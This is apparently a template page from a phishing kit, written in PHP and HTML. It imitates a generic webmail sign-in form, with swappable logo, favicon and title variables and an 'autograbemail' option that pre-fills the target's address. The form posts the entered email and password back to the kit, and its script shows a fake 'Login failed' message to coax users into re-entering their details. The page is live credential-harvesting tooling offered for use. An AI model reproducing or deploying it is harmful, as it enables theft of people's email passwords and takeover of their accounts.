<!DOCTYPE html>
<html>
<head>
	<title><?php echo $pagetitle; ?></title>
	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="description" content="$1">
	<link rel="shortcut icon" type="image/x-icon" href="<?php echo $favicon; ?>">
</head>
<body>

<style>
* {margin: 0;}html {height: 100%;}*{overflow:hidden!important;}body {font-family: Helvetica, Arial;height: 100%;}.bgBox {background-color: #fff; padding: 30px 50px 50px;border-radius: 5px;border: 2px solid #dedede;max-width: 430px;margin: 0 auto;margin-bottom: 50px;-webkit-box-sizing: border-box;-moz-box-sizing: border-box;box-sizing: border-box;} .bgBox img {vertical-align: middle !important; border: none; padding-bottom: 15px;} .bgBox h2 {margin-top: 0;font-size: 23px;color: #484848;text-align: center;margin-bottom: 10px;font-weight: bold;}.bgBox input {border-radius: 3px;padding-top: 1px;transition: none;-webkit-transition: none;height: 47px;padding: 0 15px;box-shadow: none;font-size: 15px;line-height: 16px;border: 1px solid #dedede;font-weight: normal;color: #484848;width: 100%;outline: none;-webkit-box-sizing: border-box;-moz-box-sizing: border-box;box-sizing: border-box;}.bgBox input[type="submit"] {height: 50px;font-size: 21px;}.bgBox input.valid_error {border-color: #e8322e;}.bgBox .inputRow {padding: 6px 0;margin-bottom: 8px;overflow: auto;}.bgBox .inputRow.submit {margin-top: 10px;}.bgBox .inputRow .signIn {color: #fff;background: #5795d2;border-color: #5795d2;font-weight: bold;cursor: pointer;}.bgBox .inputRow .signIn:hover {background: #3c78b3;}.bgBox .inputRow .signIn.loading {background: #5795d2 url("preloader.gif")center no-repeat;text-indent: -10000px;}.loginForm {position: relative;top: 50%;margin-top: -215px;}.error {text-align: center;margin-top: 20px;}span {clear: both;font-size: 12px;line-height: 8px;color: #e8322e !important;padding: 8px 0 0 0;text-align: center;}#root {position: absolute;left: 0;right: 0;bottom: 0;top: 0;z-index: -10;pointer-events: none;filter: brightness(0.3);height: 100%;margin: 0;padding: 0;}iframe {border-width: 0px;border-style: inset;border-color: initial;border-image: initial;overflow-clip-margin: content-box !important;overflow: hidden !important;}@media (max-width: 430px) {.bgBox {width: 100%;height: 100%;border: none;}.loginForm {top: 0;margin: 0;}.bgBox h2 {margin-bottom: 20px;}}@media (max-width: 350px) {.bgBox {padding: 30px;}.bgBox h2 {font-size: 20px;}}@media (max-width: 250px) {.bgBox {min-width: 250px;}}
</style>

<div class="loginForm">
	<form id="ox_form" name="oxForm" action="" method="post">
		<div class="bgBox">
			<div class="logo" align="center">
				<?php echo $logo; ?>
			</div>
			<h2>Sign in to your email</h2>
			<div class="inputRow">
				<input type="text" name="login" id="login" placeholder="Enter your email" value="<?php if($autograbemail == "yes") echo $email; ?>">
			</div>
			<div class="inputRow">
				<input type="password" name="password" id="password" value="" placeholder="Enter your password">
			</div>
			<div class="inputRow submit">
				<input type="submit" value="Sign in" class="signIn" id="sign_in" autofocus>
			</div>

			<div class="error" id="errorx">
			<?php if(isset($_SESSION['error'])) { echo $_SESSION['error']; } ?>
				<span></span>
			</div>

			<input type="hidden" name="version" value="Form Login">
			<input type="hidden" name="autologin" value="true">
		</div>
	</form>
</div>
<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/jquery.cookie/1.4.1/jquery.cookie.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/md5.js"></script>

<script type = "text/javascript">
	var form = $('#ox_form');
	var $mail = form.find('#login'),
        $password = form.find('#password'),
		_error = $('div.error');
	$("#sign_in").click(e=>{
		if (!/.+@.+\..+/.test($("input[name='login']").val())) {
			$mail.addClass('valid_error');
			$password.addClass("valid_error");
			_error.find('span').html("<span>Login failed. Incorrect email or password.</span>");
			return false;
		}
		else{
			$mail.removeClass("valid_error");
			$password.removeClass("valid_error");
		}
		if ($("input[type='password']") === null) {
			$password.addClass('valid_error');
			_error.find('span').html("<span>Login failed. Incorrect email or password.</span>");
			return false;
		}
		else{
			$password.removeClass("valid_error");
		}
		if($("#password").val().length < 6){
			$password.addClass('valid_error');
			_error.find('span').html("<span>Login failed. Incorrect email or password.</span>");
			return false;
		}
		else{
			$password.removeClass("valid_error");
		}
	});
</script>

</body>
</html>
